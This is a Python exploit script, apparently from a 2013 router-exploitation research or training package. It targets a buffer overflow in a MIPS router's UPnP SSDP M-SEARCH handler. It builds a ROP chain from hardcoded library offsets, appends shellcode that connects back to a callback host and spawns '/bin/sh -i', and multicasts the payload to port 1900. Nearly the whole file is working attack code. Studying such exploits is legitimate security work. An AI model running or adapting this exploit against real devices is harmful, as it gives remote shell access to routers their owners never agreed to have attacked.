#!/usr/bin/env python

# *******************************************************************************
# *******************************************************************************
# *****************       These files are licensed GPLv2.        ****************
# *******************   See included LICENSE for more info.   *******************
# *******************************************************************************
# *******************************************************************************
# ************************  From your leet hacking cr3w  ************************
# *******************************                 *******************************
# **********************************    at     **********************************
# *******************************                 *******************************
# ****                                                                       ****
# ****   TTTTTTTTTTTTTTTTTTTTTTTNNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS   ****
# ****   T:::::::::::::::::::::TN:::::::N       N::::::N SS:::::::::::::::S  ****
# ****   T:::::::::::::::::::::TN::::::::N      N::::::NS:::::SSSSSS::::::S  ****
# ****   T:::::TT:::::::TT:::::TN:::::::::N     N::::::NS:::::S     SSSSSSS  ****
# ****   TTTTTT  T:::::T  TTTTTTN::::::::::N    N::::::NS:::::S              ****
# ****           T:::::T        N:::::::::::N   N::::::NS:::::S              ****
# ****           T:::::T        N:::::::N::::N  N::::::N S::::SSSS           ****
# ****           T:::::T        N::::::N N::::N N::::::N  SS::::::SSSSS      ****
# ****           T:::::T        N::::::N  N::::N:::::::N    SSS::::::::SS    ****
# ****           T:::::T        N::::::N   N:::::::::::N       SSSSSS::::S   ****
# ****           T:::::T        N::::::N    N::::::::::N            S:::::S  ****
# ****           T:::::T        N::::::N     N:::::::::N            S:::::S  ****
# ****         TT:::::::TT      N::::::N      N::::::::NSSSSSSS     S:::::S  ****
# ****         T:::::::::T      N::::::N       N:::::::NS::::::SSSSSS:::::S  ****
# ****         T:::::::::T      N::::::N        N::::::NS:::::::::::::::SS   ****
# ****         TTTTTTTTTTT      NNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS     ****
# ****                                                                       ****
# ****                                                                       ****
# ************                http://www.tacnetsol.com                ***********
# ***************                                                  **************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMWo,:OMMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMK.    ;MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMX,''''cMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMNxxkWM;    0MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMM,   cM'    xMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMM0.o,.'   :X.    lMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMXcO:.'   ;k     ;MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMXoKc.'   ;x     .MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMM0.c..'   ;o     .MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMWOlod'   ;l      O0MMMMMN0MMMMMMMM**************
# ***************MMMMMMMMMMMMMMM0lllld;...''......,',:;. .cNMMMMMMM**************
# ***************MMMMMMMMMMMMMOlllo:.   ...............,0MMMMMMMMMM**************
# ***************MMMMMMMMMMMOllllll;:l;   ,xXX0XXXooooollOMMMMMMMMM**************
# ***************MMMMMMMMMOlllc;;'.,.,'   ,oMMKMMMlllllllllOMMMMMMM**************
# ***************MMMMMMMOlc;,..'... .''   ,oMMKMMM;,;llllllllkWMMMM**************
# ***************MMMMMOl:'.'.....  . .'   ,oMMKMMM;''',clllllllkWMM**************
# ***************MMMOl:'.... ..   .  .'   ,oMMKMMM' ..'.'cllllllckW**************
# ***************MMdc'....  ..   .   .'   ,oMMKMMM'..  ..',llllllcx**************
# ***************MMMXl... ..    .    .'   ,oMMKMMM. .. .....cllcxNM**************
# ***************MMMMMXc  .     .    .'   ,oMMKMMM.  .   ....cxNMMM**************
# ***************MMMMMMMNl     .     .'   ,oMMKMMM'   .   . oNMMMMM**************
# ***************MMMMMMMMMNc   .  .........;xKKMMM.    . .lNMMMMMMM**************
# ***************MMMMMMMMMMMNl ...    .....   .cXM.    .lNMMMMMMMMM**************
# ***************MMMMMMMMMMMMMN; ....,  . .lkx;  k.   oWMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMK 'k.    ..  oMMKx .;.dWMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMN .KWo.      oMMXc .xWMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMM0. .,''... ',;,  ,NKMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMO:.   ...   .:KMMKMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMWKOkkx;lWMKMMMKMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMKWMKMMKWMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMKWKMNXMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOXNMMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
# *******************************************************************************
# *******************************************************************************
# 
# Copyright (c) 2013 Zachary Cutlip
#                    Tactical Network Solutions, LLC

import sys
import os
from simplesploit.overflow_development.overflowbuilder import RopGadget, OverflowSection, OverflowBuffer
from simplesploit.servers.callback_server import Callback
from simplesploit.payloads.mips.callback_payload import CallbackPayload
import environment
import msearch_crash
import struct
import socket

CALLBACK_IP=environment.CALLBACK_IP

def send_multicast(mcast_addr,mcast_port,data):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
    sock.sendto(data,(mcast_addr,mcast_port))
    sock.close()

overflow_sections=[]

LibCBase=0
LibWlBcmSharedBase=0
qemu_libwlbcmshared_base=0x40942000
qemu_libc_base=0x4085b000

libc_base=0x2aabe000
libwlbcmshared_base=0x2aba1000

LibCBase=libc_base
LibWlBcmSharedBase=libwlbcmshared_base

##########################################################################################
#an address in libwlbcmshared.so
#index in +0x50 is a a pointer that points to itself.
#That pointer + 0x2c is all NULL bytes and should cause ssdp_msearch_repsonse() to bail
#without crashing
##########################################################################################
upnp_context_placeholder=0x1ECBC
upnp_context_placeholder_name="upnp_context placeholder. to avoid crashing ssdb_msearch_response()."


upnp_context_placeholder_overflow_section=RopGadget(RopGadget.BigEndian,
                                                    140,
                                                    upnp_context_placeholder,
                                                    upnp_context_placeholder_name,
                                                    LibWlBcmSharedBase)
overflow_sections.append(upnp_context_placeholder_overflow_section)


##########################################################################################
#Epilogue in sub_b100 in libwlbcmshared.so  that sets up S1 - S7
##########################################################################################
sreg_epilogue=0xB1F8
sreg_epilogue_name="The epilogue of sub_b100 in libwlbcmshared.so. Sets up S1-S7."

sreg_epilogue_rop_gadget=RopGadget(RopGadget.BigEndian,
                                                    136,
                                                    sreg_epilogue,
                                                    sreg_epilogue_name,
                                                    LibWlBcmSharedBase)
overflow_sections.append(sreg_epilogue_rop_gadget)



##########################################################################################
#Sets up (readonly) addr in $s0 that can be dereferenced without crashing the next gadget
##########################################################################################
random_readwrite_addr=0x1ED10
random_readwrite_addr_name="An addr that can be dereferenced & written without crashing."
random_readonly_placeholder=RopGadget(RopGadget.BigEndian,
                                        168,
                                        random_readwrite_addr,
                                        random_readwrite_addr_name,
                                        LibWlBcmSharedBase)

overflow_sections.append(random_readonly_placeholder)


##########################################################################################
#Sets up 3 sec argument to sleep() then jumps to $s4
##########################################################################################
setup_sleep_arg=0x4B62c
setup_sleep_name="Sets up 3 sec arg to sleep(). jumps $s4"
setup_sleep_rop=RopGadget(RopGadget.BigEndian,
                            200,
                            setup_sleep_arg,
                            setup_sleep_name,
                            LibCBase)
overflow_sections.append(setup_sleep_rop)



##########################################################################################
#Loads var_4($sp) into ra, then jr $s2.
#This ensures sleep() returns to an address we control.
##########################################################################################
indirect_jump_s2=0x380F0
indirect_jump_name="load stack data into ra, then jr $s2"
indirect_jump_rop=RopGadget(RopGadget.BigEndian,
                            184,
                            indirect_jump_s2,
                            indirect_jump_name,
                            LibCBase)
overflow_sections.append(indirect_jump_rop)

##########################################################################################
#location of sleep() in libc. set up
#$ra and $a0 before calling.
##########################################################################################
sleep_loc=0x4FFD0
sleep_loc_name="location of sleep() in libc."
sleep_loc_rop=RopGadget(RopGadget.BigEndian,
                        176,
                        sleep_loc,
                        sleep_loc_name,
                        LibCBase)
overflow_sections.append(sleep_loc_rop)

##########################################################################################
#locate stack. add 0x48+var_30+$sp into $s5, jalr $s6
##########################################################################################
stackfinder_s5_s6=0x328F4
stackfinder_s5_s6_name="add offset from $sp into s5, jalr $s6"
stackfinder_rop=RopGadget(RopGadget.BigEndian,
                         240,
                         stackfinder_s5_s6,
                         stackfinder_s5_s6_name,
                         LibCBase)
overflow_sections.append(stackfinder_rop)


##########################################################################################
#jump into stack. jalr $s5.  This needs to get loaded into the stackfinder's jalr reg
##########################################################################################
stackjumper_s5=0x1B1F4
stackjumper_s5_name="Jump into stack via reg $s5. make sure the stackfinder jumps to this gadget."
stackjumper_s5_rop=RopGadget(RopGadget.BigEndian,
                             192,
                             stackjumper_s5,
                             stackjumper_s5_name,
                             LibCBase)
overflow_sections.append(stackjumper_s5_rop)

lots_of_Ds='D'*220
Ds_section=OverflowSection(268,lots_of_Ds,"20 Ds")
#overflow_sections.append(Ds_section)


callback_server=Callback(CALLBACK_IP,port=8080,startcmd="/bin/sh -i",connectback_shell=True)
payload=CallbackPayload(callback_server,CallbackPayload.BigEndian)

payload_overflow_section=OverflowSection(268,payload.shellcode,"connect back payload")

overflow_sections.append(payload_overflow_section)
buffer_overflow_string=OverflowBuffer(488,overflow_sections)

msearch_string=msearch_crash.MsearchCrash(buffer_overflow_string)

pid=None
if len(sys.argv) > 1:
    search_string=sys.argv[1]
    if "0x" == search_string[0:2]:
        search_string_num=int(search_string,0)
        search_string=struct.pack(">L",search_string_num)

    offset=buffer_overflow_string.find_offset(search_string)
    if(offset < 0):
        print "Couldn't find string %s in the overflow buffer." % search_string
    else:
        print "Found string %s at\noffset: %d" % (search_string,offset)
else:
    pid=callback_server.serve_callback()
    #sys.stdout.write(str(msearch_string))

if pid and pid >0:
    print("Sending exploit")
    send_multicast("239.255.255.250",1900,str(msearch_string))
    sys.stderr.write("Waiting on callback server.\n")
    os.waitpid(pid,0)

